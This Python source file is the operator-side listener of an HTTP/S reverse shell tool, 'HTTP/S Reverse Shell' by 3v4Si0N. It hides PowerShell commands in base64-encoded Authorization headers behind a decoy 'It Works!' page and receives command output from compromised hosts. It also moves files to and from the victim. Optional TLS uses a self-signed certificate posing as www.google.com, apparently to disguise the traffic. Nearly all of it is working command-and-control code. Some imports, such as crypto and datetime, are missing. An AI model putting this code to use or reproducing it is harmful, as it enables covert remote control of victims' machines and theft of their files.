#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from termcolor import colored
import urllib.parse
import time
import readline
import ssl
import argparse
import json

readline.parse_and_bind("tab: complete")

"""
    For HTTPS Server
        Create certificate using the commands:
                - openssl genrsa -out private.pem 2048
                - openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
"""



class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        html = "<html><body><h1>It Works!</h1></body></html>"

        result, parser_type, json_response, color = self.parseResult()
        pwd = self.getPwd(json_response)

        if (self.isDownloadFunctCalled(json_response)):
            filename, file_content, output = self.parseDownload(json_response)
            functions = Functions()
            functions.download(filename, file_content, output)
        else:
            if json_response["result"] != json_response["pwd"]:
                self.printResult(result, color)

        try:
            command = self.newCommand(pwd)
            self.sendCommand(command, html)
        except BrokenPipeError:
            pass
        return

    def parseResult(self):
        test_data = self.rfile.read(int(self.headers['Content-Length']))
        data = json.loads(test_data)
        parser_type = data["type"]
        result = ""
        color = "white"

        if parser_type != "newclient":
            try:
                if (parser_type == "C0MM4ND"):
                    color = "white"
                elif (parser_type == "UPL04D" or parser_type == "D0WNL04D"):
                    color = "green"
                elif (parser_type == "3RR0R"):
                    color = "red"
                
                result = urllib.parse.unquote(data["result"])
                result = (base64.b64decode(data["result"])).decode('utf-8')
            except:
                pass
        else:
            input(colored("[!] New Connection, please press ENTER!",'red'))

        
        return result, parser_type, data, color

    def parseDownload(self, json_result):
        downloaded_file_path = ""
        output = ""
        file_content = ""

        try:
            output = json_result["result"]
            downloaded_file_path = json_result["pathDst"]
            file_content = json_result["file"]
        except KeyError:
            pass

        return downloaded_file_path, file_content, output

    def getPwd(self, json_response):
        try:
            if json_response["pwd"]:
                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
                pwd = pwd_decoded.decode('utf-8').strip()
        except KeyError:
            pwd_decoded = base64.b64decode(json_response["result"].encode())
            pwd = pwd_decoded.decode('utf-8').strip()
        return pwd

    def printResult(self, result, color):
        print(colored(result, color))

    def isDownloadFunctCalled(self, json_response):
        iscalled = False
        try:
            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                iscalled = True
        except KeyError:
            pass
        return iscalled

    def newCommand(self, pwd):
        if pwd != "":
            command = input(colored("PS {}> ".format(pwd), "blue"))
            if command == "":
                command = "pwd | Format-Table -HideTableHeaders"
        else:
            command = "pwd | Format-Table -HideTableHeaders"
        return command

    def sendCommand(self, command, html, content=""):
        if (command != ""):
            if (command.split(" ")[0] == "upload"):
                functions = Functions()
                try:
                    upload = command.split(" ")[0]
                    filename = command.split(" ")[1]
                    content = functions.upload(filename)
                    html = content.decode('utf-8')
                except AttributeError:
                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
                except IndexError:
                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
            elif (command.split(" ")[0] == "download"):
                try:
                    download = command.split(" ")[0]
                    srcFile = command.split(" ")[1]
                    dstFile = command.split(" ")[2]
                except IndexError:
                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                    print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))

            CMD = base64.b64encode(command.encode())
            self.send_header('Authorization',CMD.decode('utf-8'))
            self.end_headers()
            self.wfile.write(html.encode())


class Functions():
    def upload(self, filename):
        try:
            with open(filename, mode='rb') as file: # b is important -> binary
                content = file.read()
                return base64.b64encode(content)
        except FileNotFoundError:
            print (colored("\r\n[!] Source file not found!", "red"))

    def download(self, filename, content, output):
        try:
            with open(filename, mode='wb') as file: # b is importante -> binary
                content = base64.b64decode(content)
                file.write(content)
                print(colored(output, "green"))
        except:
            print (colored("\r\n[!] Error: Writing file!", "red"))

class Certificate():
    def checkCertificateExpiration(self):
        expired = False

        cert = crypto.load_certificate(crypto.FILETYPE_PEM, open('certificate/cacert.pem', 'rt').read())
        cert_date = datetime.strptime(cert.get_notAfter().decode('utf-8'),"%Y%m%d%H%M%SZ")
        today = date.today()
        current_date = today.strftime("%Y-%m-%d")

        if str(current_date) == str(cert_date).split(" ")[0]:
            expired = True
        return expired

    def genCertificate(self, KEY_FILE="certificate/private.pem", CERT_FILE="certificate/cacert.pem"):
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 4096)

        cert = crypto.X509()
        cert.get_subject().C = "UK"
        cert.get_subject().ST = "London"
        cert.get_subject().L = "London"
        cert.get_subject().O = "Development"
        cert.get_subject().CN = "www.google.com"
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(31557600)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha512')
        with open(CERT_FILE, "wt") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
        with open(KEY_FILE, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))

    def checkCertPath(self):
        exist = False
        if (path.exists("certificate/cacert.pem") and path.exists("certificate/private.pem")):
            exist = True
        return exist

def main():

    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (colored(banner, 'yellow'))
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))

        if (args.ssl):
            cert = Certificate()
            if ((cert.checkCertPath() == False) or cert.checkCertificateExpiration()):
                cert.genCertificate()
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        server.serve_forever()

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.socket.close()

main()
